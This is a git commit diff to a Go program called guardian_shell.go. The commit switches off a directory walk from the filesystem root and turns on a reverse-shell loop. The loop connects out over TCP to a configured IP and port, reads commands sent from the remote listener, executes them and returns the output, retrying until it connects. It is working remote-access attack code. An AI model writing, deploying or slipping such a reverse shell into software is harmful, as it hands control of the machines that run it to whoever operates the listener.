6ec5e5ca868d90c1a299e96eb382945d42308987
Awet Tsegazeab <avvvet@gmail.com>
2024-02-21 09:29:58 -0500

    dir listing todo

--- guardian_shell.go
+++ guardian_shell.go
@@ -1,9 +1,14 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"io/fs"
-	"path/filepath"
+	"log"
+	"net"
+	"time"
+
+	"github.com/avvvet/guardian-shell/internal/utils"
 )
 
 const (
@@ -19,56 +24,57 @@ func walkResult(path string, d fs.DirEntry, err error) error {
 	}
 
 	if d.IsDir() {
-		fmt.Printf("directory path -> %s", path)
+		fmt.Printf("directory path -> %s, size -> %s \n", path, d.Name())
 	}
 
 	return nil
 }
 
 func main() {
-	//port := utils.GetPortFromArgs()
+	port := utils.GetPortFromArgs()
 
 	//list directory
-	root := "/"
-	err := filepath.WalkDir(root, walkResult)
-	if err != nil {
-		fmt.Println("Error:", err)
-	}
-
 	/*
-		for {
-
-			address := fmt.Sprintf("%s:%d", reverseIP, port)
-
-			conn, err := net.Dial("tcp", address)
-			if err != nil {
-				fmt.Printf("Error connecting to the guardian shell listner on port %d. Retrying in %d seconds...\n", port, retryDelay)
-				time.Sleep(time.Second * retryDelay)
-				continue
-			}
-			defer conn.Close()
-
-			log.Println("Connected to the reverse guardian listner!")
-			fmt.Fprint(conn, utils.PrintWelcomeMessage())
-
-			for {
-				command, err := bufio.NewReader(conn).ReadString('\n')
-				if err != nil {
-					fmt.Println("Error reading command:", err)
-					break
-				}
-
-				output, err := utils.ExecuteCommands(command)
-				if err != nil {
-					fmt.Println("Error executing command:", err)
-				}
-				// log the coming comman
-				log.Printf("$ %s", command)
-
-				//send command output to guardian listner
-				fmt.Fprint(conn, output)
-			}
-
+		root := "/"
+		err := filepath.WalkDir(root, walkResult)
+		if err != nil {
+			fmt.Println("Error:", err)
 		}
 	*/
+
+	for {
+
+		address := fmt.Sprintf("%s:%d", reverseIP, port)
+
+		conn, err := net.Dial("tcp", address)
+		if err != nil {
+			fmt.Printf("Error connecting to the guardian shell listner on port %d. Retrying in %d seconds...\n", port, retryDelay)
+			time.Sleep(time.Second * retryDelay)
+			continue
+		}
+		defer conn.Close()
+
+		log.Println("Connected to the reverse guardian listner!")
+		fmt.Fprint(conn, utils.PrintWelcomeMessage())
+
+		for {
+			command, err := bufio.NewReader(conn).ReadString('\n')
+			if err != nil {
+				fmt.Println("Error reading command:", err)
+				break
+			}
+
+			output, err := utils.ExecuteCommands(command)
+			if err != nil {
+				fmt.Println("Error executing command:", err)
+			}
+			// log the coming comman
+			log.Printf("$ %s", command)
+
+			//send command output to guardian listner
+			fmt.Fprint(conn, output)
+		}
+
+	}
+
 }
